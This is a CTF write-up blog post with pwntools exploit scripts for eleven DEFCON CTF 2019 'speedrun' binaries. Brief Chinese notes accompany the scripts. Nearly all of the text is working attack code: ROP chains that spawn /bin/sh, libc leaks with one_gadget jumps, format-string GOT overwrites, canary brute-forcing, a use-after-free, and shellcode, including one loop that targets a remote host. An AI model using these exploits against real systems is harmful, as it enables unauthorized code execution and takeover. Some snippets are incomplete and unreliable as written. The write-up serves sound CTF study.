---
layout: post
title:  "DEFCON CTF 2019-Speedrun"
date:   2019-7-10
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,DEFCON CTF,Pwn]
icon: icon-html
---

# DEFCON CTF 2019-Speedrun

* speedrun-001

  系统调用

  ```python
  from pwn import *
  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
  #r = process('./speedrun-001')
  syscall_ret = 0x474e65
  pop_rax = 0x415664
  pop_rdi = 0x400686
  pop_rsi = 0x4101f3
  pop_rdx = 0x4498b5
  bss = 0x6bb2e0
  main_addr = 0x400bc1
  padding = 'a'*0x400 + 'b'*0x8
  
  payload  = padding
  payload += p64(pop_rdi)	+ p64(0)	
  payload += p64(pop_rsi)	+ p64(bss)
  payload += p64(pop_rdx)	+ p64(8)
  payload += p64(pop_rax) + p64(0)
  payload += p64(syscall_ret)
  payload += p64(main_addr)
  r.recvuntil("Any last words?")
  r.sendline(payload)
  r.send("/bin/sh\x00")
  
  payload  = padding
  payload += p64(pop_rdi)	+ p64(bss)
  payload += p64(pop_rsi)	+ p64(0)
  payload += p64(pop_rdx)	+ p64(0)
  payload += p64(pop_rax) + p64(59)
  payload += p64(syscall_ret)
  payload += p64(main_addr)
  
  r.recvuntil("Any last words?")
  r.sendline(payload)
  r.interactive()
  ```

  

* speedrun-002

  one_gadget

  ```python
  from pwn import *
  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
  #r = process(['./pwnbeta'],env = {"LD_PRELOAD":"./libc-2.27.so"})
  elf = ELF('./speedrun-002')
  libc = ELF('libc-2.27.so')
  puts_plt = elf.plt['puts']
  puts_got = elf.got['puts']
  puts_libc = libc.symbols['puts']
  libc_start_got = elf.got['__libc_start_main']
  
  pwn_addr = 0x40074c
  p_rdi = 0x4008a3
  
  padding = 'a'*0x400 + 'b'*0x8
  
  def leak(got):	
  	r.sendline('Everything intelligent is so boring.')
  	payload = padding + p64(p_rdi) + p64(got) + p64(puts_plt) + p64(pwn_addr)
  	r.sendline(payload)
  	r.recvuntil('Fascinating.\n')
  	leak = r.recvuntil("\x0a", drop = True).ljust(8,'\x00')
  	leak = u64(leak)
  	return leak
  
  
  puts_leak = leak(puts_got)
  libc_start_leak = leak(libc_start_got)
  print(hex(puts_leak))
  print(hex(libc_start_leak))
  
  libc_base = puts_leak - puts_libc
  one_gadget = libc_base+0x10a38c
  payload2 = padding + p64(one_gadget)
  r.sendline('Everything intelligent is so boring.')
  r.sendline(payload2)
  r.interactive()
  ```

  

* speedrun-003

  直接运行shellcode，后面加一段"\x50"*5 + "\x07"满足异或后的条件

  ```python
  from pwn import *
  shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
  shellcode += "\x50"*5 + "\x07"
  r.sendline(shellcode)
  r.interactive()
  ```

  

* speedrun-004

  只能溢出一位，只能控制rbp，payload开头放几个ret，能不能运行payload看脸

  ```python
  from pwn import *
  
  pop_rax = 0x415f04
  pop_rsi = 0x410a93
  pop_rdi = 0x400686
  pop_rdx = 0x44a155
  syscall_ret = 0x474f15
  bss = 0x6BB300
  ret = 0x400BD1
  
  payload = p64(ret)*12+p64(pop_rdi) + p64(0)	
  payload += p64(pop_rsi)	+ p64(bss)
  payload += p64(pop_rdx)	+ p64(8)
  payload += p64(pop_rax) + p64(0)
  payload += p64(syscall_ret)
  payload += p64(pop_rdi)	+ p64(bss)
  payload += p64(pop_rsi)	+ p64(0)
  payload += p64(pop_rdx)	+ p64(0)
  payload += p64(pop_rax) + p64(59)
  payload += p64(syscall_ret)
  
  payload = payload.ljust(257,'\x00')
  r.recvuntil('how much do you have to say?\n')
  r.sendline('257')
  r.recvuntil('Ok, what do you have to say for yourself?\n')
  r.send(payload)
  r.sendline('/bin/sh\x00')
  r.interactive()
  ```

  

* speedrun-005

  把puts_got改成main_addr，实现多次利用

  泄露libc基址，然后把printf_got改成system

  ```python
  from pwn import *
  r = process(['./speedrun-005'],env = {"LD_PRELOAD":"./libc-2.27.so"})
  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
  elf = ELF('./speedrun-005')
  libc = ELF('./libc-2.27.so')
  puts_got = elf.got['puts']
  read_got = elf.got['read']
  printf_got = elf.got['printf']
  read_libc = libc.symbols['read']
  system_libc = libc.symbols['system']
  main_addr= 0x040069d
  offset = 6
  #aaaa%6$x
  r.recvuntil('time? ')
  payload = 'aa%4195995c%8$ln'+ p64(puts_got)
  r.send(payload)
  payload = 'fuck%7$s'+p64(read_got)
  r.send(payload)
  r.recvuntil('uck')
  a = r.recv(6).ljust(8,'\x00')
  read_leak = u64(a)
  print(hex(read_leak))
  
  libc_base = read_leak- read_libc
  system = libc_base + system_libc
  fuck = system
  fuck_bytes= hex(fuck)[2:]
  print(fuck_bytes)
  a = int(fuck_bytes[10:],16)
  b = int(fuck_bytes[8:10],16)+0xf00-a
  c = int(fuck_bytes[6:8],16)+2*0xf00-a-b
  d = int(fuck_bytes[4:6],16)+4*0xf00-a-b-c
  e = int(fuck_bytes[2:4],16)+8*0xf00-a-b-c-d
  f = int(fuck_bytes[:2],16)+16*0xf00-a-b-c-d-e
  
  payload = ''
  payload += '%'+str(a)+'c%16$hhn'
  payload += '%'+str(b)+'c%17$hhn'
  payload += '%'+str(c)+'c%18$hhn'
  payload += '%'+str(d)+'c%19$hhn'
  payload += '%'+str(e)+'c%20$hhn'
  payload += '%'+str(f)+'c%21$hhn'
  payload = payload.ljust(80,'a')
  payload += p64(printf_got)
  payload += p64(printf_got+1)
  payload += p64(printf_got+2)
  payload += p64(printf_got+3)
  payload += p64(printf_got+4)
  payload += p64(printf_got+5)
  
  r.send(payload)
  
  r.interactive()
  ```

  

* speedrun-006

  输入的shellcode被改变，前面加上xor语句清空除rip外所有寄存器。在5,10,20,29除插入0xcc(int3)

  0xcc

  0xcc前面加上0xb2，变成mov dl, 0xcc

  shellcode开头写个syscall，令rcx=rip，得到一个可用地址

  调用read在rcx+0xcc再写一段shellcode，然后跳过去

  ```python
  from pwn import *
  r = process('./speedrun-006')
  context(os='linux', arch='amd64')
  
  s1 = asm("""
    syscall
    mov dl, 0xcc
    """)
  
  s2 = asm("""
    add cl, 0xcc
    """)
    
  s3 = asm("""
    mov rsi, rcx
    syscall
    jmp rsi
    """)
  
  r.recvuntil("Send me your ride")
  
  shellcode1 = s1 + '\xb2' + s2 + '\xb2' + s3  
  shellcode1 = shellcode1.ljust(26, '\x90')
  r.send(shellcode1)
  
  shellcode2 = asm("""
     mov al, 0x3b
     mov rdi, rsi
     add rdi, 0x11
     xor rsi, rsi
     xor rdx, rdx
     syscall
  """)
  shellcode2 += "/bin/sh\x00"
  r.sendline(shellcode2)
  
  r.interactive()
  ```

  

* speedrun-007

  ```python
  # -*- coding: UTF-8 -*-
  from pwn import *
  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
  # rbp + 0x238 => <__libc_start_main+231>
  #ca:0650│   0x7ffdcf9d9d58 —▸ 0x7fab6ece7b97 (__libc_start_main+231) ◂— mov    edi, eax
  #83:0418│ rbp  0x7ffdcf9d9b20 —▸ 0x7ffdcf9d9d30 —▸ 0x7ffdcf9d9d50 —▸ 0x55e820d58a00 ◂— push   r15
  # rbp -0x400 +0x638
  #hex(-231-137904+0x4f322)
  #
  one_gadget = 0x4f322
  while True:
      r = remote('pwn2.blue-whale.me',19906)
      #r = process(['./pwneta'],env = {"LD_PRELOAD":"./libc-2.27.so"})
      r.recvuntil("What do you have this time")
      r.send("a")
      r.recvuntil("Changes you'd like to make (y/n)?")
      r.send("y")
      offset = 0x638
      #gdb.attach(r)
      r.send(p16(offset))
      r.send(chr(0x22))
      r.recvuntil("Changes you'd like to make (y/n)?")
      r.send("y")
      r.send(p16(offset+1))
      r.send(chr(0xe3))
      r.recvuntil("Changes you'd like to make (y/n)?")
      r.send("y")
      r.send(p16(offset+2))
      r.send(chr(0xd6))
      r.recvuntil("Changes you'd like to make (y/n)?")
      r.send("n")
      r.recvuntil('L8R.')
      try:
          r.sendline('cat flag')
          a = r.recvuntil('}',timeout=1)
          print(a)
          if '{' in a:
              print(a)
              r.interactive()
              break
          r.close()
  
      except:
          r.close()
          continue
  ```

  

* speedrun-008

  爆破canary

  ```python
  from pwn import *
  elf = ELF('./speedrun-008')
  canary = ''
  while True:
  	for i in range(0x100):
  		print(i)
  		r = 
  		payload = 'a'*0x408 + canary + chr(i)
  		r.send(payload)
  		r.recvuntil('Whatever\n')
  		try:
  			if 'Peace' in r.recvline():
  				canary += chr(i)
  				print(canary)
  				break
  		except:
  			pass
  		finally:
  			r.close()
  	print('gg')
  	if len(canary) == 8:
  		print(canary)
  		break
  
  pop_rdi = 0x400686
  pop_rsi = 0x410253
  pop_rdx = 0x449915
  pop_rax = 0x4156c4
  syscall = 0x474ec5
  read = 0x449900
  bss = elf.bss()
  
  payload = ''
  payload += 'a' * 0x408
  payload += canary
  payload += 'a' * 8
  payload += p64(pop_rdi) + p64(0)
  payload += p64(pop_rsi) + p64(bss)
  payload += p64(pop_rdx) + p64(8)
  payload += p64(read)
  payload += p64(pop_rdi) + p64(bss)
  payload += p64(pop_rsi) + p64(0)
  payload += p64(pop_rdx) + p64(0)
  payload += p64(pop_rax) + p64(0x3b)
  payload += p64(syscall)
  r.send(payload)
  r.send('/bin/sh\x00')
  r.interactive()
  ```

  

* speedrun-009

  格式化字符串泄露libc基址和canary，然后跳one_gadget

  ```python
  from pwn import *
  
  #r = process(['./speedrun-009'],env = {"LD_PRELOAD":"./libc-2.27.so"})
  libc = ELF('./libc-2.27.so')
  r.recvuntil('1, 2, or 3')
  r.send('2%163$llxfuck')
  r.recvuntil('Is that it "')
  canary = int(r.recvuntil('fuck',drop = True), 16)
  print(hex(canary))
  r.recvuntil('1, 2, or 3')
  r.send('2%169$llxfuck')
  r.recvuntil('Is that it "')
  leak = r.recvuntil('fuck',drop = True)
  libc_base = int(leak, 16) - (libc.symbols['__libc_start_main']+231)
  r.recvuntil('1, 2, or 3')
  one_gadget = libc_base + 0x4f322
  payload = '1' + 'a'*0x408 + p64(canary) + 'a'*0x8 + p64(one_gadget) + chr(0) * 0x100
  r.send(payload)
  r.recvuntil('3')
  r.send('3')
  
  r.interactive()
  
  ```

  

* speedrun-010

  uaf，name和message上都有puts函数指针，把message填充到puts前打印出puts的地址计算libc基址

  然后把puts改成system，然后name输入/bin/sh\x00，执行system(""/bin/sh")

  ```python
  from pwn import *
  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
  #context.log_level = 'debug' 
  #r = process(['./speedrun-010'],env = {"LD_PRELOAD":"./libc-2.27.so"})
  libc = ELF('./libc-2.27.so')
  puts_libc = libc.symbols['puts']
  system_libc = libc.symbols['system']
  
  def add_name(name):
      r.sendafter('1, 2, 3, 4, or 5\n', '1')
      r.sendafter('name', name)
  
  def add_message(message):
      r.sendafter('1, 2, 3, 4, or 5\n', '2')
      r.sendafter('message', message)
  
  def free_name():
      r.sendafter('1, 2, 3, 4, or 5\n', '3')
  
  def free_message():
      r.sendafter('1, 2, 3, 4, or 5\n', '4')
  
  add_name('a')
  free_name()
  add_message('a' * 0x10)
  r.recvuntil('says \n')
  fuck = r.recvuntil('\n',drop = True)
  fuck = fuck[0x10:].ljust(8, '\x00')
  libc_base = u64(fuck) - puts_libc
  print(hex(libc_base))
  system = libc_base + system_libc
  add_name('/bin/sh\x00')
  free_name()
  payload = 'a' * 0x10 + p64(system)
  add_message(payload)
  r.interactive()
  ```

  

* speedrun-011

  盲注

  跑shellcode前flag被打开，指针在rdi中

  一位一位比较，相同进死循环，不同正常退出

  ```python
  from pwn import *
  context(os = 'linux', arch = 'amd64')
  chars = '_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}'
  flag = ''
  while True:
  	print('fuck')
  	for i in chars:
  		r = process('./speedrun-011')
  		shellasm = '''
  			xor rax, rax
  			mov al, byte ptr [rdi+{}]
  			cmp al, {}
  			je fuck
  			mov al, 60
  			syscall
  		fuck:
  			jmp fuck
  		'''.format(len(flag), ord(i))
  		shellcode = asm(shellasm)
  		r.send(shellcode)
  		if 'Alarm clock' in r.recvall():
  			flag+=i
  			print(flag)
  			break
  	if flag[-1] == '}':
  		break
  ```

  